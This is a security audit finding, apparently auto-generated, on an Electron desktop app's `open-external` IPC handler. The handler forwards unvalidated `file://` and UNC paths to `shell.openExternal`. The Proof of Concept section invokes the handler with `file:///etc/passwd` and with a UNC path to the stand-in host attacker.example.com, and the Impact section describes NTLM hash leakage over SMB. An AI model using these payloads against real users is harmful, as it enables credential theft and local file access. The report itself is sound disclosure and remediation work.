### Title
Unvalidated URI scheme reaches `shell.openExternal` via `open-external` IPC handler, allowing `file://`/UNC-based local file and SMB share access - (File: app/src/main-process/main.ts)

### Summary
The `open-external` IPC handler in `app/src/main-process/main.ts` accepts any string from the renderer and passes it directly to `shell.openExternal()`. The only scheme check present is a conditional `log.info` call for `http://`/`https://` prefixes — it performs no enforcement, i.e. any other scheme (or lack thereof) still falls through to `shell.openExternal(path)` unchanged.

### Finding Description
The handler is defined as: [1](#0-0) 

```
ipcMain.handle('open-external', async (_, path: string) => {
  const pathLowerCase = path.toLowerCase()
  if (
    pathLowerCase.startsWith('http://') ||
    pathLowerCase.startsWith('https://')
  ) {
    log.info(`opening in browser: ${path}`)
  }

  try {
    await shell.openExternal(path)
    return true
  } ...
```

The `if` block only decides whether to log a message; there is no `else` branch that rejects or sanitizes non-http(s) input, and execution continues unconditionally to `shell.openExternal(path)`.

This handler is reachable from renderer-controlled, attacker-influenced content. `LinkButton`, used throughout the renderer to render clickable links (including links derived from markdown-rendered issue/PR/commit content), calls `shell.openExternal(uri)` on click without any scheme validation: [2](#0-1) 

`shell` here is `app/src/lib/app-shell.ts`'s `IAppShell`, whose `openExternal` is a direct proxy to the main-process IPC channel: [3](#0-2) [4](#0-3) 

Since `uri` values that reach `LinkButton` can originate from rendered markdown links in GitHub content (issue bodies, PR descriptions, commit messages) that are attacker-controlled, and no scheme allow-list exists anywhere along this path (`LinkButton` → `app-shell.openExternal` → IPC `invokeProxy('open-external', 1)` → `ipcMain.handle('open-external', ...)` → `shell.openExternal(path)`), a value such as `file:///etc/passwd`, a Windows UNC path (`\\attacker-host\share`), or other non-http(s) schemes will reach `shell.openExternal` unmodified.

### Impact Explanation
`shell.openExternal` on Windows with UNC-style paths or `file://` URIs pointing at SMB shares can cause the OS to initiate an outbound SMB connection, which can leak the current user's NTLM hash to an attacker-controlled host (a well-documented Windows UNC path exfiltration technique). Additionally, `file://` URIs pointing at local executables can result in those executables being launched by the OS shell, and other custom URI schemes registered on the host OS could be invoked with attacker-supplied arguments. This breaks the intended invariant that renderer-triggered "open link" actions are restricted to web URLs, and exposes local file/network access and credential-adjacent leakage without any additional user interaction beyond a single click on a link rendered from external content.

### Likelihood Explanation
This requires an unprivileged attacker to place a link with a non-http(s) scheme inside content the victim will render and click (e.g., an issue/PR description, commit message, or other markdown rendered inside the Desktop app) — no local access, malware, or credentials are required, and the click is the only "unnatural" step, which is a normal expected user interaction for a rendered hyperlink.

### Recommendation
In the `open-external` handler in `app/src/main-process/main.ts`, reject (return `false`/throw) instead of merely logging when the scheme is not `http:` or `https:`. Parse the input with the `URL` class and explicitly allow-list `http:`/`https:` (and any other schemes intentionally supported, e.g. `mailto:` if needed) before calling `shell.openExternal`.

### Proof of Concept
From a renderer context (e.g., via devtools or a markdown-rendered link handled by `LinkButton`), invoke:
```js
require('electron').ipcRenderer.invoke('open-external', 'file:///etc/passwd')
```
or on Windows:
```js
require('electron').ipcRenderer.invoke('open-external', '\\\\attacker.example.com\\share')
```
Because the handler at [1](#0-0)  only inspects the scheme to decide whether to log, and unconditionally calls `shell.openExternal(path)`, the file/UNC path is passed straight to Electron's `shell.openExternal`, triggering local file handling / outbound SMB behavior instead of being rejected.

export function invokeProxy<T extends keyof RequestResponseChannels>(
  channel: T,
  numArgs: ParameterCount<RequestResponseChannels[T]>
) {
  return (...args: Parameters<RequestResponseChannels[T]>) => {
    // This as any cast here may seem unsafe but it isn't since we're guaranteed
    // that numArgs will match the parameter count of the IPC declaration.
    args = args.length !== numArgs ? (args.slice(0, numArgs) as any) : args
    return ipcRenderer.invoke(channel, ...args)
  }
}
